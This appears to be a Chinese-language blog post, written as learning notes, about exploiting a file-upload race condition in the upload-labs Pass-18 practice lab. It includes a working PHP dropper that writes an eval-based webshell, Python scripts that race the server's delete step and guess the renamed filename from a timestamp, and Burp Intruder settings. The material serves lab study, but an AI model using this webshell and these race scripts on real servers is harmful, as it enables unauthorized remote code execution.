---
title: "由条件竞争引出的python脚本学习"
subtitle: ""

description: ""
date: 2024-03-16T15:19:10+08:00
draft: false

tags: ["条件竞争","python"]
categories: ["Web seruity"]

---

## 0x01 原理

之前在ctfshow刷题时遇到了有关`session.upload_progress`的利用，学到一半发现出了个没见过的新玩意：条件竞争。原本想早些啃下来的，奈何技能大赛被抓去打取证和设备，于是就搁置了。虽说这俩都是迟早要学习的东西吧，但确实很难让我提起兴趣（web安全真香）。历经一周的折磨后我终于能有时间来把这一块搞明白了。

条件竞争的原理其实并不难理解，Freebuf上有一片帖子描述的就很贴切：唯快不破。

举个栗子：我们用ATM机提现，账户余额有500元。我们向ATM发出提取500元的请求，提取完毕后，ATM机会执行一个清空我们余额的行为；那么倘若我们在提取500元的请求与清空余额的行为之间再发出一个提取500元的请求，那会怎么样呢？

倘若请求发出成功，那结果便是我们多提取了500元，这便是条件竞争。

>  再深一点的目前我讲不明白，至少我现在这个阶段这么理解暂且没有问题

我接触到的条件竞争利用便是文件上传，在网站检测到我们上传了恶意文件后，会有一个删除恶意文件的动作，我们只需要在该文件被删除前利用这个文件即可，因此我在upload-labs进行了相关实验

## 0x02 相关实验

### 题目

- 环境：upload-labs，Pass-18

- 镜像：monstertsl/upload-labs

- 工具：vscode，burpsuite2024

源码如下：

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

可以看到后端对我们上传的文件进行了重命名，用两位随机数与时间戳进行拼接，正是这一段代码引出了后面有关python脚本的学习， 虽然这题本身并没有那么复杂，但还是要感谢开拓了我的思维的学长。

条件竞争部分：

```php
if(move_uploaded_file($temp_file, $upload_file)){
    if(...){
        ...
    }
    else{
        unlink($upload_file)
    }
}
```

这段代码的执行逻辑为：先移动，后检测，不符合再删除

因此这里给了我们利用条件竞争的机会

### 利用方法

分三个部分：

1. 首先是我们上传的恶意代码，倘若直接上传webshell，由于利用时间太短，不可能给我们getshell的机会，因此可以写一个用于创建webshell的文件，这样只要我们成功访问该脚本，就可以在服务器上留下另一个webshell

2. 其次是用python脚本不断访问这个恶意脚本，直至条件竞争利用成功

3. 最后用burp持续上传脚本文件，总有一次会在服务端检测到恶意文件至删除文件这个时间段内被python脚本访问到的

### 具体实现

恶意文件`backdoor.php`内容如下：

```php
<?php fputs(fopen('shell.php', 'w'), '<?php @eval($_POST["cmd"])?>');
```

python脚本：

```python
import requests

url = "http://localhost:8081/upload/backdoor.php"
while True:
    r = requests.get(url)
    if r.status_code == 200:
        print("Upload success!")
        break
    else:
        print("Retrying.")
```

burp设置：

抓包后发送到Intruder，将`Payload type`设置为`Null payloads`，用于发送原本的包，并设置发送次数

![](/img/由条件竞争引出的python脚本学习/2024-03-16-16-19-01-image.png)

接着就可以开始上传了

首先运行python脚本，接着burp开始上传，很快就可以利用成功



接下来就可以getshell了



## 0x03  有关python脚本的学习

还记得之前源码中的那段改文件名的时间戳么，没错，虽然聪哥方向错了（也许是大意了，没注意程序的执行顺序），但他针对这个重命名文件所做出的操作令我大开眼界，我似乎看到属于我的第一个阶梯了。

主要代码

```php
$img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
```

首先上传一张图片看看被修改后的图片名

![](/img/由条件竞争引出的python脚本学习/2024-03-16-18-49-02-image.png)

~~她真好看~~

结合源码不难看出拼接过程如下：

- 前两位为10-99中随机的数

- 后14位是依据当下时间生成的时间戳

因此文件上传后的文件名是我们可以预测的

用到的库：

- requests：用于发送http请求

- datetime：用于构造时间戳



为了构造时间戳，首先要获得当下的时间

```python
nowTime = datetime.datetime.now()
```

此时的`nowTime` 变量可以拆解成年月日时分秒，例如

```python
print(nowTime.year)    # 输出2024
```

由于我们最后是要进行拼接的，因此需要转化为字符串

```python
print(str(nowTime.year)
```

接下来就可以进行拼接了

```python
nowTime = datetime.datetime.now()
stamp = (
    str(nowTime.year)+
    str(nowTime.month)+
    str(nowTime.day)+
    str(nowTime.hour)+
    str(nowTime.minute)+
    str(nowTime.second)
)
```

但是这同样有问题，因为在时间戳中，单独的数要用0补全为两位

因此要用到`zfill()`函数

- `zfill()`：为字符串定义长度，若不足用0填补



最后再用for循环构造前两位随机数

最后便可写出如下脚本

```python
import requests
import datetime

url = "http://localhost:10086/upload/%s.php"


def Attack(target):
    r = requests.get(target)
    if r.status_code == 200:
        print("Upload seccessed!")
        exit()
    else:
        print("Retrying.")


while True:
    for i in range(10, 99):
        nowTime = datetime.datetime.now()

        stamp = (
            str(nowTime.year)
            + str(nowTime.month).zfill(2)
            + str(nowTime.day).zfill(2)
            + str(nowTime.hour).zfill(2)
            + str(nowTime.minute).zfill(2)
            + str(nowTime.second).zfill(2)
        )

        target = url % (str(i) + stamp)
        Attack(target)

```



## 0x04 闲话

还是学到了很多的，原本想这天把`session.upload_progress`的利用搞明白的，现在来看又要搁置了，剩下不到两周时间还是得专心搞设备，毕竟是第一次参加这种比赛，还是不希望仅仅只是混了点经验就回来